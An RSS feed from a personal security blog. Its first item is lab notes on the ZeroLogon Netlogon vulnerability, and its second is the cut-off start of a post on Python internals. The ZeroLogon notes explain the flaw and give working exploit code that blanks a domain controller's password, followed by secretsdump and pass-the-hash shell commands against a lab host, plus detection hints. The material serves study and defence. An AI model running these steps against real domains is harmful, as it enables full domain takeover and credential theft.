<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Vlaghe&#39;s Blog</title>
    <link>https://vlagh3.github.io/</link>
    <description>Recent content on Vlaghe&#39;s Blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Tue, 03 May 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://vlagh3.github.io/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>ZeroLogon</title>
      <link>https://vlagh3.github.io/notes/zerologon/</link>
      <pubDate>Tue, 03 May 2022 00:00:00 +0000</pubDate>
      
      <guid>https://vlagh3.github.io/notes/zerologon/</guid>
      <description>NetLogon Protocol  Overview  is an RPC interface (Windows domain controllers) used 4 user and machine authentication (e.g logging in to servers using NTLM, update password) available over TCP through a dynamic port set by the portmapper service OR through an SMB pipe on 445 it uses a customized cryptographic protocol to let a client (a domain-joined computer) and server (the domain controller) prove to each other that they both know a shared secret (i.</description>
      <content>&lt;h2 id=&#34;netlogon-protocol&#34;&gt;NetLogon Protocol&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Overview&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;is an RPC interface &lt;em&gt;(Windows domain controllers)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;used 4 user and machine authentication &lt;em&gt;(e.g logging in to servers using NTLM, update password)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;available over TCP through a dynamic port set by the &lt;em&gt;portmapper&lt;/em&gt; service OR through an SMB pipe on &lt;code&gt;445&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;it uses a customized cryptographic protocol to let a client &lt;em&gt;(a domain-joined computer)&lt;/em&gt; and server &lt;em&gt;(the domain controller)&lt;/em&gt; prove to each other that they both know a shared secret &lt;em&gt;(i.e hash of the client&amp;rsquo;s account password)&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;initial auth handshake
&lt;ul&gt;
&lt;li&gt;&lt;img src=&#34;https://vlagh3.github.io/img/auth_handshake_zerologon.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;aes-cfb8-insecure-use&#34;&gt;AES-CFB8 insecure use&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;The cryptographic primitive both the client and server use to generate credential values is implemented in a function called &lt;code&gt;ComputeNetlogonCredential&lt;/code&gt; &lt;em&gt;(takes an 8-byte input &amp;amp; performs transformasion w the secret esssion key)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;To acomplish this it uses the &lt;a href=&#34;https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#CFB&#34;&gt;CFB8 (8-bit cypher feedback) mode&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;img src=&#34;https://vlagh3.github.io/img/aes_cfb8.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Instead of generating the Initialization Vector &lt;em&gt;(IV)&lt;/em&gt; randomly, the &lt;code&gt;ComputeNetlogonCredential&lt;/code&gt; function &lt;strong&gt;defines it as a fixed value which consits of 16 zero bytes&lt;/strong&gt; =&amp;gt; this violates the requirments for using AES-CFB8 securely&lt;/li&gt;
&lt;li&gt;Ok but what could go wrong? Well: &lt;strong&gt;for 1 in 256 keys, applying AESCFB8 encryption to an all-zero plaintext will result in all-zero ciphertext&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;&lt;img src=&#34;https://vlagh3.github.io/img/aes_cfb8_broken.png&#34; alt=&#34;&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://vlagh3.github.io/img/exploit_zerologon.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Spoofing the client credential
&lt;ul&gt;
&lt;li&gt;after exchanging challenges with a &lt;code&gt;NetrServerReqChallenge&lt;/code&gt; call&lt;/li&gt;
&lt;li&gt;a client authenticates by doing a &lt;code&gt;NetrServerAuthenticate3&lt;/code&gt; call, which has a parameter &lt;code&gt;ClientCredential&lt;/code&gt; &lt;em&gt;(that is computed by applying the &lt;code&gt;ComputeNetlogonCredential&lt;/code&gt; to the client challenge)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;because we have control over the client challenge there&amp;rsquo;s nothing stopping us to set it to 8 zeroes =&amp;gt; for 1 in 256 session keys, the correct &lt;code&gt;ClientCredential&lt;/code&gt; will also consist of 8 zeroes&lt;/li&gt;
&lt;li&gt;session key will be different for every authentication attempt&lt;/li&gt;
&lt;li&gt;computer accounts are not locked after invalid login attempt =&amp;gt; we can try a bunch of times until we hit a key &amp;amp; authentication succeeds&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Disabling signing &amp;amp; sealing
&lt;ul&gt;
&lt;li&gt;ok we can bypass the auth call, but we still have no idea what the value of the session key is&lt;/li&gt;
&lt;li&gt;it becomess problematic due to Netlogon&amp;rsquo;ss transport encryption mechanism &lt;em&gt;(RPC signing &amp;amp; sealing)&lt;/em&gt;, which uses this key but a different scheme than &lt;code&gt;ComputeNetlogonCredential&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;luckily, signing &amp;amp; sealing is optional =&amp;gt; so we can simply omit the flag in the &lt;code&gt;NetrServerAuthenticate3&lt;/code&gt; call &amp;amp; continue&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Spoofing a call
&lt;ul&gt;
&lt;li&gt;even when encryption is disabled, every call must contain a so-called &lt;code&gt;authenticator&lt;/code&gt; value which is computed by applying &lt;code&gt;ComputeNetlogonCredential(w session key)&lt;/code&gt; to the &lt;code&gt;ClientStoredCredential + Timestamp&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;ClientStoredCredential&lt;/code&gt;: incrementing value maintained by the client &amp;amp; intialised to the same value as the &lt;code&gt;ClientCredential&lt;/code&gt; we provided =&amp;gt; will be 0&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Timestamp&lt;/code&gt;: the current Posix time; server doesn&amp;rsquo;t place many restriction on this value =&amp;gt; simply pretend that it’s January 1st, 1970 = 0&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ComputeNetlogonCredential(0) = 0&lt;/code&gt; =&amp;gt; we can authenticate our first call by simply providing an all-zero authenticator &amp;amp; timestamp&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Changing computer&amp;rsquo;s AD password
&lt;ul&gt;
&lt;li&gt;we can leverage the &lt;code&gt;NetrServerPasswordSet2&lt;/code&gt; call to set a new password for the client
&lt;ul&gt;
&lt;li&gt;password is not hashed but it is encrypted with the session key by using again &lt;code&gt;CFB8&lt;/code&gt; with an all-zero IV&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;plaintext password structure in the Netlogon protocol consists of 516 bytes &lt;em&gt;(last 4 being the pass len)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;provide 516 zeroes =&amp;gt; decryption to 516 zeroes =&amp;gt; zero-length password &lt;em&gt;(setting empty passwords for a computer is not forbidden)&lt;/em&gt; =&amp;gt; can set an empty password for any computer in the domain&lt;/li&gt;
&lt;li&gt;afterwards, we can simply set up a new Netlogon connection on behalf of this computer&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;NOTE&lt;/strong&gt;: When changing a computer password in this way it is only changed in the AD. The targeted system itself will still locally store its original password.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;From pass change to domain admin&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;lab&#34;&gt;Lab&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Perequistes&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;check out the &lt;a href=&#34;https://github.com/SecuraBV/CVE-2020-1472&#34;&gt;POC released by secura&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;install &lt;a href=&#34;&#34;&gt;impacket&lt;/a&gt;:
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 -m pip install virtualenv
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 -m virtualenv impacketEnv  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;source impacketEnv/bin/activate
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pip install git+https://github.com/SecureAuthCorp/impacket
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;setup a local Domain Name Controller &lt;em&gt;(&lt;a href=&#34;https://tryhackme.com/room/zer0logon&#34;&gt;THM zer0logon room&lt;/a&gt;)&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Modify &lt;code&gt;zerologon_tester.py&lt;/code&gt; to reset the domain controller password &amp;amp; run it: &lt;code&gt;python zerologon_tester.py DC01 10.10.45.187&lt;/code&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;build_new_pass_req&lt;/span&gt;(dc_handle, target_computer):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;newPassRequest &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; nrpc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;NetrServerPasswordSet2()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;newPassRequest[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;PrimaryName&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; dc_handle &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;newPassRequest[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;AccountName&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; target_computer &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;$&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;newPassRequest[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;SecureChannelType&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; nrpc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;NETLOGON_SECURE_CHANNEL_TYPE&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ServerSecureChannel
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;newPassRequest[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ComputerName&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; target_computer &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/76c93227-942a-4687-ab9d-9d972ffabdab&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;auth &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; nrpc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;NETLOGON_AUTHENTICATOR()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;auth[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Credential&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;auth[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Timestamp&amp;#39;&lt;/span&gt;]  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;newPassRequest[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Authenticator&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; auth
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# consists of 516 bytes of random padding: junk + password + length of pass (last 4 bytes)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;newPassRequest[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ClearNewPassword&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;516&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; newPassRequest
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;try_zero_authenticate&lt;/span&gt;(dc_handle, dc_ip, target_computer):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# It worked!&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; server_auth[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ErrorCode&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	server_auth&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dump()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;server challenge &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;serverChall&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    	&lt;span style=&#34;color:#75715e&#34;&gt;# Trigger password reset&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    	print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Attempting password reset on &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;target_computer&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;...&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		newPassReq &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; build_new_pass_req(dc_handle, target_computer)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		res        &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; rpc_con&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;request(newPassReq)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		res&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dump()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Exception&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; e:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    	print(e)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; rpc_con
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;Dump hashes with &lt;a href=&#34;https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/secretsdump.py&#34;&gt;impacket&amp;rsquo;s secretsdump.py&lt;/a&gt;: &lt;code&gt;python secretsdump.py -just-dc HOLOLIVE/DC01\$@10.10.45.187&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Pop shell w &lt;a href=&#34;https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py&#34;&gt;wmiexec.py&lt;/a&gt; by passing the hash: &lt;code&gt;python wmiexec.py HOLOLIVE/Administrator@10.10.45.187 -hashes aad3b435b51404eeaad3b435b51404ee:3f3ef89114fb063e3d7fc23c20f65568&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;packet-analysis&#34;&gt;Packet Analysis&lt;/h2&gt;
&lt;p&gt;TODO&lt;/p&gt;
&lt;h2 id=&#34;mitigation--detection&#34;&gt;Mitigation &amp;amp; Detection&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;many tries to authenticate unssuccessfully&lt;/li&gt;
&lt;li&gt;zero key stream in auth netlogon pkgs&lt;/li&gt;
&lt;li&gt;ssign &amp;amp; sseal flags are disabled&lt;/li&gt;
&lt;li&gt;timesstamp in auth value is 0&lt;/li&gt;
&lt;li&gt;choosing cipher suite of AES-CFB8&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;wirehark rule to detect it &lt;em&gt;(based on timestamp, negotiation opts, challenge &amp;amp; iv?)&lt;/em&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;references&#34;&gt;References&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.crowdstrike.com/blog/cve-2020-1472-zerologon-security-advisory/&#34;&gt;Zerologon (CVE-2020-1472): An Unauthenticated Privilege Escalation to Full Domain Privileges&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=EzVmGQr2IFw&#34;&gt;Zerologon Attack Explained Technical - CVE-2020-1472&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.secura.com/uploads/whitepapers/Zerologon.pdf&#34;&gt;Whitepaper: secura&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    </item>
    
    <item>
      <title>Python internals for fun (&amp; profit?)</title>
      <link>https://vlagh3.github.io/posts/python-vm/</link>
      <pubDate>Sun, 08 Aug 2021 12:36:11 +0300</pubDate>
      
      <guid>https://vlagh3.github.io/posts/python-vm/</guid>
      <description>Introduction Today I want to speak about python. I recently, realized that I&amp;rsquo;ve been using python on a day-to-day basis, but never actually wondered into the magic that happens under the hood, whenever I run a python piece of code. Therefore, as a quest to fulfill my curiosity and maybe use what I learn in my advantage I started researching how python does its magic.
 DISCLAIMER: The information in this article is strictly based on my personal research and understanding of the subject which is in no way, shape or form one of a professional.</description>
      <content>&lt;h1 id=&#34;introduction&#34;&gt;Introduction&lt;/h1&gt;
&lt;p&gt;Today I want to speak about python. I recently, realized that I&amp;rsquo;ve been using python on a day-to-day basis, but never actually wondered into the magic that happens under the hood, whenever I run a python piece of code. Therefore, as a quest to fulfill my curiosity and maybe use what I learn in my advantage I started researching how python
does its magic.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;DISCLAIMER&lt;/strong&gt;: The information in this article is strictly based on my personal research and understanding of the subject which is in no way, shape or form one of a professional. As a result, if you notice something wrong please ping me and upon consensus I will change the flawed section&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;so-how-do-machines-work&#34;&gt;So how do machines work?&lt;/h1&gt;
&lt;p&gt;Very simply put, in order to create a program you write source code in a language. That, is further translated into instructions that the &lt;em&gt;CPU&lt;/em&gt; can read &lt;em&gt;(machine code)&lt;/em&gt;. This process is done by a compiler &lt;em&gt;(e.g gcc)&lt;/em&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;						gcc prog.c -o prog		
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		Source Code		-----compiler-----&amp;gt;		Machine Code
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Think of machine code as just a series of 1&amp;rsquo;s and 0&amp;rsquo;s or on&amp;rsquo;s and off&amp;rsquo;s. What the numbers mean is up to what/who-ever is reading them, and in the processor&amp;rsquo;s case, it takes action based on the number &lt;em&gt;(instruction)&lt;/em&gt; it sees currently in the memory. Such actions might be writing a value to memory, modifying a value, jumping to another place, reading a value, etc. Different architectures have different recognizable instructions &lt;em&gt;(&lt;a href=&#34;https://en.wikipedia.org/wiki/Opcode&#34;&gt;opcodes&lt;/a&gt;)&lt;/em&gt; based on the processor&amp;rsquo;s manufacturer &lt;em&gt;(e.g &lt;a href=&#34;http://www.c-jump.com/CIS77/CPU/x86/lecture.html#X77_0140_encoding_add_ecx_eax&#34;&gt;intel&lt;/a&gt;)&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;This construct was used since the early days of programming with languages such as: Pascal, C, C++. However, other modern programming languages &lt;em&gt;(e.g Java, Python)&lt;/em&gt; use a slightly different strategy in order to make programs
more portable across platforms. They translate the source code into bytecode, which is recognized and further executed by a &amp;ldquo;virtual&amp;rdquo; processor. By virtual I mean that the actual &amp;ldquo;processor&amp;rdquo; is just a program written in a lower-level language such as C or in the machine&amp;rsquo;s hardware language itself. So, the same programs can run on any architecture that has the virtual machine program implemented on it which &amp;rsquo;translates&amp;rsquo; that code dynamically. &lt;em&gt;(e.g python interpretr)&lt;/em&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;																			/--&amp;gt; Windows
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Source code	&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;.py&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; --python compiler--&amp;gt; Byte code &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;.pyc&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; ---PVM----&amp;gt; Machine Code
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;																			&lt;span style=&#34;color:#ae81ff&#34;&gt;\-&lt;/span&gt;-&amp;gt; Linux
